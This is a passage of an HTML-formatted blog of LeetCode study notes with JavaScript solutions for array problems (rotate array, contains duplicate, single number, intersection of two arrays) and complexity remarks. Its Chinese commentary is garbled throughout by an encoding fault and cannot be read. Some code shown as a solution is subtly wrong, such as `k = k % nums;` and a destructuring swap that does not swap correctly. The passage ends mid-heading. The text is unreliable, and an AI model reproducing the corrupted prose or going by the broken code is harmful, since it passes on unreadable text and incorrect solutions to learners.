æŒªåŠ¨æœ€çŸ­çš„æŸ±å­(è¿™æ ·é¢ç§¯æ‰æœ‰å¯èƒ½å˜å¤§).</span></span><br><span class="line">    <span class="keyword">let</span> minHeight = height[i] &lt; height[j] ? height[i++] : height[j--];</span><br><span class="line">    <span class="keyword">let</span> area = minHeight * (j - i + <span class="number">1</span>);</span><br><span class="line">    max = <span class="built_in">Math</span>.max(max, area);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹Ÿèƒ½éå†æ¯ä¸€ç§æƒ…å†µï¼Œä¸”åªæ˜¯å•å¾ªç¯ã€‚ï¼ˆè‡ªå·±å¯¹åŒæŒ‡é’ˆæ˜¯çœŸä¸äº†è§£ï¼‰</p><h3 id="å¤æ‚åº¦åˆ†äº«"><a href="#å¤æ‚åº¦åˆ†äº«" class="headerlink" title="å¤æ‚åº¦åˆ†äº«"></a>å¤æ‚åº¦åˆ†äº«</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(N)ï¼ŒåŒæŒ‡é’ˆæ€»è®¡æœ€å¤šéå†æ•´ä¸ªæ•°ç»„ä¸€æ¬¡ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ï¼Œåªéœ€è¦é¢å¤–çš„å¸¸æ•°çº§åˆ«çš„ç©ºé—´ã€‚</li></ul><h2 id="LeetCode189â€”â€”æ—‹è½¬æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode189â€”â€”æ—‹è½¬æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode189â€”â€”æ—‹è½¬æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode189â€”â€”æ—‹è½¬æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/rotate-array/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -14"><a href="#è‡ªå·±çš„ä»£ç -14" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = nums.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">    nums.unshift(nums[len-<span class="number">1</span>])</span><br><span class="line">    nums.pop(len);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åªèƒ½æƒ³åˆ°popåŠ unshiftè¿™ä¸€ç§æ–¹æ³•äº†ï¼Œè¿˜è¿‡ä¸äº†ï¼ˆè¶…å‡ºæ—¶é—´é™åˆ¶ï¼‰ã€‚é¢˜ç›®è¦æ±‚æœ€å¥½ç”¨ä¸‰ç§æ–¹æ³•å®ç°=-=æˆ‘å¤ªèœäº†ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-4"><a href="#æ€è·¯1-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p><strong>ä½¿ç”¨é¢å¤–çš„æ•°ç»„ï¼š</strong>åŸæ¥é¢˜ç›®è¦æ±‚çš„ç©ºé—´å¤æ‚åº¦O(1)æ˜¯æ€è€ƒé¢˜ï¼Œå®³ï¼Œåªèƒ½æ€ªè‡ªå·±è¯»é¢˜ä¸ä»”ç»†äº†ã€‚è¿™æ–¹æ³•ç®€å•ï¼ˆä¸è´´äº†ï¼‰ã€‚</p><h3 id="å¤æ‚åº¦åˆ†æ-9"><a href="#å¤æ‚åº¦åˆ†æ-9" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a><strong>å¤æ‚åº¦åˆ†æ</strong></h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼š O(n)ï¼Œå…¶ä¸­ n ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼š O(n)ã€‚</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-4"><a href="#æ€è·¯2-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>æ•°ç»„ç¿»è½¬ï¼šå¤ªå·§å¦™äº†ï¼</p><ol><li>é¦–å…ˆå¯¹æ•´ä¸ªæ•°ç»„å®è¡Œç¿»è½¬ï¼Œè¿™æ ·å­åŸæ•°ç»„ä¸­éœ€è¦ç¿»è½¬çš„å­æ•°ç»„ï¼Œå°±ä¼šè·‘åˆ°æ•°ç»„æœ€å‰é¢ã€‚</li><li>è¿™æ—¶å€™ï¼Œä» k<em>k</em> å¤„åˆ†éš”æ•°ç»„ï¼Œå·¦å³ä¸¤æ•°ç»„ï¼Œå„è‡ªè¿›è¡Œç¿»è½¬å³å¯ã€‚</li></ol><p><img src="https://i.loli.net/2021/06/19/7lAjQBuiYGXET6d.jpg" alt="Snipaste_2021-06-19_16-25-58.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> reverse = <span class="function"><span class="keyword">function</span> (<span class="params">nums, start, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">    [nums[start++],nums[end--]]=[nums[end],nums[start]]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  k = k % nums;</span><br><span class="line">  reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">  reverse(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">  reverse(nums, k, nums.length-<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> nums</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>k = k % nums;</code>ä¹Ÿå¾ˆå…³é”®ï¼Œå®¹æ˜“é—å¿˜ã€‚</p><h3 id="å¤æ‚åº¦åˆ†æ-10"><a href="#å¤æ‚åº¦åˆ†æ-10" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ nn ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚æ¯ä¸ªå…ƒç´ è¢«ç¿»è½¬ä¸¤æ¬¡ï¼Œä¸€å…± n ä¸ªå…ƒç´ ï¼Œå› æ­¤æ€»æ—¶é—´å¤æ‚åº¦ä¸º O(2n)=O(n)ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚</p></li></ul><h3 id="æ€è·¯3-amp-é¢˜è§£-4"><a href="#æ€è·¯3-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>å¯¹äºæ•°ç»„nums,å‘å³ç§»åŠ¨kä½ç§»ï¼Œç­‰ä»·äºå°†åŸæ•°ç»„ç¬¬nums.length-kä½ç½®åˆ°æœ«å°¾ç§»åŠ¨åˆ°å‰é¢ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">    k = k%nums.length</span><br><span class="line">    nums.unshift(...nums.splice(nums.length-k))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åŸæ¥çœŸçš„å¯ä»¥ä¸€ä¸¤è¡Œä»£ç å®ç°ã€‚åšçš„æ—¶å€™ä¹Ÿæœ‰æƒ³åˆ°å¦‚ä½•æŠŠåé¢ä¸€å †ç»Ÿä¸€ç§»åŠ¨åˆ°å‰é¢ã€‚ <strong>splice</strong> è¿™ä¸ªæ–¹æ³•ä¸€å®šè¦æŒæ¡å•Šï¼</p><h2 id="LeetCode217â€”â€”å­˜åœ¨é‡å¤å…ƒç´ ï¼ˆâ˜†ï¼‰"><a href="#LeetCode217â€”â€”å­˜åœ¨é‡å¤å…ƒç´ ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode217â€”â€”å­˜åœ¨é‡å¤å…ƒç´ ï¼ˆâ˜†ï¼‰"></a>LeetCode217â€”â€”å­˜åœ¨é‡å¤å…ƒç´ ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/contains-duplicate/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -15"><a href="#è‡ªå·±çš„ä»£ç -15" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = nums.length; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.indexOf(nums[i])!==i) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åšå‡ºæ¥é—®é¢˜ä¸å¤§ï¼Œä½†æ˜¯æ—¶é—´å¤æ‚åº¦ç«Ÿç„¶è¾¾åˆ°äº† O(n^2)ï¼ä»¥åå†™ä»£ç ä¸€å®šè¦æ³¨æ„å•Šã€‚ï¼ˆindexOfæŒ‰é¡ºåºéå†åˆ—è¡¨ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼‰</p><h3 id="æ€è·¯1-amp-é¢˜è§£-5"><a href="#æ€è·¯1-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>å…ˆå°†æ•°ç»„æ’åºï¼Œç„¶åå†éå†åˆ¤æ–­ã€‚ï¼ˆä¸ºä»€ä¹ˆåšé¢˜çš„æ—¶å€™æƒ³ä¸åˆ°å‘¢ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">const</span> n = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] === nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-11"><a href="#å¤æ‚åº¦åˆ†æ-11" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(NlogN)ï¼Œå…¶ä¸­ NN ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚éœ€è¦å¯¹æ•°ç»„è¿›è¡Œæ’åºã€‚ï¼ˆæ—¶é—´å¤æ‚åº¦å¤ªé«˜äº†ï¼ï¼‰</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(logN)ï¼Œå…¶ä¸­ NN ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚æ³¨æ„æˆ‘ä»¬åœ¨è¿™é‡Œåº”å½“è€ƒè™‘é€’å½’è°ƒç”¨æ ˆçš„æ·±åº¦ã€‚</p></li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-5"><a href="#æ€è·¯2-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>å“ˆå¸Œè¡¨:</p><ol><li>åˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œç„¶åä»å·¦å¾€å³éå†æ•°ç»„ã€‚</li><li>æ£€æµ‹å“ˆå¸Œè¡¨ä¸­æ˜¯å¦å·²å­˜åœ¨å½“å‰å­—ç¬¦ï¼Œè‹¥å­˜åœ¨ï¼Œç›´æ¥è¿”å›ç»“æœï¼Œè‹¥ä¸å­˜åœ¨ï¼Œå°†å½“å‰å­—ç¬¦åŠ å…¥å“ˆå¸Œè¡¨ï¼Œä¾›åç»­åˆ¤æ–­ä½¿ç”¨å³å¯ã€‚</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.has(i))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.set(i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-12"><a href="#å¤æ‚åº¦åˆ†æ-12" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a><strong>å¤æ‚åº¦åˆ†æ</strong></h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚</li></ul><h2 id="LeetCode136â€”â€”åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼ˆâ˜†ï¼‰"><a href="#LeetCode136â€”â€”åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode136â€”â€”åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼ˆâ˜†ï¼‰"></a>LeetCode136â€”â€”åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/single-number/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -16"><a href="#è‡ªå·±çš„ä»£ç -16" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10000</span>).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">    arr[i] +=<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æ€ç»´æ°¸è¿œæ˜¯å°å­¦ç”Ÿæ€ç»´ï¼Œä»€ä¹ˆæ—¶å€™æ‰èƒ½å†™å‡ºåƒæ ‡ç­”ä¸€æ ·çš„ä»£ç å•Šã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-6"><a href="#æ€è·¯1-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>æ’åºåæ¯”è¾ƒï¼Œè€ç”Ÿå¸¸è°ˆäº†ã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£-6"><a href="#æ€è·¯2-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>åˆ©ç”¨map Hashæ˜ å°„</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    nums.forEach(<span class="function"><span class="params">item</span> =&gt;</span>&#123;</span><br><span class="line">        map.set(item, map.has(item) ? map.get(item) + <span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> [key, val] <span class="keyword">of</span> map.entries())&#123;</span><br><span class="line">        <span class="keyword">if</span>(val === <span class="number">1</span>) <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ç©ºé—´å¤æ‚åº¦ä¸ºO(n)ï¼Œæ—¶é—´å¤æ‚åº¦ O(n)</p><h3 id="æ€è·¯3-amp-é¢˜è§£-5"><a href="#æ€è·¯3-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>å¼‚æˆ–è¿ç®—ï¼š</p><ul><li>ä¸€ä¸ªæ•°å’Œ 0 åš XOR è¿ç®—ç­‰äºæœ¬èº«ï¼šaâŠ•0 = a</li><li>ä¸€ä¸ªæ•°å’Œå…¶æœ¬èº«åš XOR è¿ç®—ç­‰äº 0ï¼šaâŠ•a = 0</li><li>XOR è¿ç®—æ»¡è¶³äº¤æ¢å¾‹å’Œç»“åˆå¾‹ï¼šaâŠ•bâŠ•a = (aâŠ•a)âŠ•b = 0âŠ•b = b</li><li>å°†æ‰€æœ‰æ•°å­—æŒ‰ç…§é¡ºåºåšå¼‚æˆ–è¿ç®—ï¼Œæœ€åå‰©ä¸‹çš„ç»“æœå³ä¸ºå”¯ä¸€çš„æ•°å­—</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> num <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        ans ^= num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">return</span> nums.reduce(<span class="function">(<span class="params">pre,cur</span>) =&gt;</span> pre ^ cur);</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-13"><a href="#å¤æ‚åº¦åˆ†æ-13" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)</li></ul><h2 id="LeetCode350â€”â€”ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†-IIï¼ˆâ˜†ï¼‰"><a href="#LeetCode350â€”â€”ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†-IIï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode350â€”â€”ä¸¤ä¸ªæ•°ç»„çš„äº¤é›† IIï¼ˆâ˜†ï¼‰"></a>LeetCode350â€”â€”ä¸¤ä¸ªæ•°ç»„çš„äº¤é›† IIï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -17"><a href="#è‡ªå·±çš„ä»£ç -17" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> intersect = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr1 = [],arr2=[],arr=[];</span><br><span class="line">  arr1 = nums1.length &lt; nums2.length ? [...nums1] : [...nums2];</span><br><span class="line">  arr2 = nums1.length &lt; nums2.length ? [...nums2] : [...nums1];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr2.indexOf(arr1[i]) !== -<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(arr1[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr  <span class="comment">// [1,2] [1,1]=&gt;[1,1]</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‘ç°åˆ°ç°åœ¨é‡åˆ° <strong>åˆ¤æ–­æ•°ç»„ä¸­çš„æŸä¸ªå€¼æ˜¯å¦å­˜åœ¨</strong> è¿˜æ˜¯åªä¼š indexOf ï¼Œè€Œè¿™ä¸ªapiæ„Ÿè§‰ä¸å¤ªæœ‰ç”¨ï¼Œæ¯”å¦‚è¿™é‡Œæ²¡æ³•åˆ¤æ–­é‡å¤ [1,2] [1,1]=&gt;[1]ã€‚</p><p>çªç„¶å‘ç°ï¼Œè‡ªå·±çš„ç¬¬3ã€4è¡Œä»£ç å¥½å‚»ã€‚<code> if (nums1.length &lt; nums2.length) [nums1, nums2] = [nums2, nums1];</code> è¿™ä¸é¦™å—ï¼Ÿ</p><h3 id="æ€è·¯-amp-é¢˜è§£-9"><a href="#æ€è·¯-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆï¼šå…ˆè¡Œå°†æ•°ç»„æ’åºï¼Œæ–¹ä¾¿æŸ¥æ‰¾ï¼Œç„¶åæ­£å¼æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆ i æŒ‡å‘ nums1 æ•°ç»„é¦–ä½ï¼ŒæŒ‡é’ˆ j æŒ‡å‘ nums2 æ•°ç»„é¦–ä½ã€‚</li><li>åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ ˆï¼Œç”¨äºå­˜æ”¾ç»“æœé›†ã€‚</li><li>å¼€å§‹æ¯”è¾ƒæŒ‡é’ˆ i å’ŒæŒ‡é’ˆ j çš„å€¼å¤§å°ï¼Œè‹¥ä¸¤ä¸ªå€¼ä¸ç­‰ï¼Œåˆ™æ•°å­—å°çš„æŒ‡é’ˆï¼Œå¾€å³ç§»ä¸€ä½ã€‚</li><li>è‹¥æŒ‡é’ˆ i å’ŒæŒ‡é’ˆ j çš„å€¼ç›¸ç­‰ï¼Œåˆ™å°†äº¤é›†å‹å…¥æ ˆã€‚</li><li>è‹¥ nums æˆ– nums2 æœ‰ä¸€æ–¹éå†ç»“æŸï¼Œä»£è¡¨å¦ä¸€æ–¹çš„å‰©ä½™å€¼ï¼Œéƒ½æ˜¯å”¯ä¸€å­˜åœ¨ï¼Œä¸”ä¸ä¼šä¸ä¹‹äº§ç”Ÿäº¤é›†çš„ã€‚</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> intersect = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    nums1.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    nums2.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">let</span> l = <span class="number">0</span>, r = <span class="number">0</span>, ans = [];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; nums1.length &amp;&amp; r &lt; nums2.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums1[l] === nums2[r]) &#123;</span><br><span class="line">            ans.push(nums1[l]);</span><br><span class="line">            l++;</span><br><span class="line">            r++;</span><br><span class="line">        &#125; <span class="keyword">else</span> nums1[l] &lt; nums2[r] ? l++ : r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆä¸æ„¿æ„å…ˆæ’åºæ•°ç»„å•Šã€‚æ˜æ˜ä¸€è¡Œä»£ç ä¹…èƒ½æå®šçš„äº‹ã€‚</p><blockquote><p>æœ‰ä¸€ä¸ªç–‘é—®ï¼š<code>nums1.sort((a, b) =&gt; a - b);</code>å’Œ<code>nums1.sort()</code>æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿä¸ºä»€ä¹ˆæ”¹æˆåé¢çš„å°±è¿‡ä¸äº†ï¼Ÿ</p></blockquote><h3 id="æ€è·¯2-amp-é¢˜è§£-7"><a href="#æ€è·¯2-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>çœ‹å®Œç½‘ä¸Šçš„ï¼Œå‘ç°è‡ªå·±ä¹‹å‰çš„ä»£ç ä¹Ÿèƒ½å®ç°ã€‚O(n^2)æš´ç ´ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr=[];</span><br><span class="line">  <span class="keyword">if</span> (nums1.length &lt; nums2.length) [nums1, nums2] = [nums2, nums1]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> n = nums2.indexOf(nums1[i]);</span><br><span class="line">    <span class="keyword">if</span> ( n!== -<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(...nums2.splice(n,<span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> arr </span><br></pre></td></tr></table></figure><p>ä¹‹å‰è´¥åœ¨arrçš„é•¿åº¦é—®é¢˜ï¼Œå…¶å®ç”¨spliceå¯¹nums2è¿›è¡Œç¼©å‡å°±å®Œå…¨æ²¡é—®é¢˜äº†ã€‚æ³¨æ„éœ€è¦ç”¨â€¦æ‹“å±•è¿ç®—ç¬¦å°†å¾—åˆ°çš„æ•°ç»„å˜æˆå­—ç¬¦ã€‚</p><h3 id="æ€è·¯3-amp-é¢˜è§£-6"><a href="#æ€è·¯3-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>å“ˆå¸Œè¡¨ï¼š(è¿˜æ²¡ä»”ç»†çœ‹)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> intersect = <span class="function">(<span class="params">nums1, nums2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> num1 <span class="keyword">of</span> nums1) &#123; <span class="comment">// è®°å½•nums1å„ä¸ªæ•°å­—çš„å‡ºç°æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (map[num1]) &#123;</span><br><span class="line">      map[num1]++;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">      map[num1] = <span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> num2 <span class="keyword">of</span> nums2) &#123; <span class="comment">// éå†nums2ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ•°å­—åœ¨nums1å‡ºç°è¿‡</span></span><br><span class="line">    <span class="keyword">const</span> val = map[num2];</span><br><span class="line">    <span class="keyword">if</span> (val &gt; <span class="number">0</span>) &#123;            <span class="comment">// æœ‰å‡ºç°è¿‡</span></span><br><span class="line">      res.push(num2);         <span class="comment">// æ¨å…¥resæ•°ç»„</span></span><br><span class="line">      map[num2]--;            <span class="comment">// åŒ¹é…æ‰ä¸€ä¸ªï¼Œå°±å‡ä¸€ä¸ª</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode66â€”â€”åŠ ä¸€ï¼ˆâ˜†ï¼‰"><a href="#LeetCode66â€”â€”åŠ ä¸€ï¼ˆâ˜†ï¼‰" 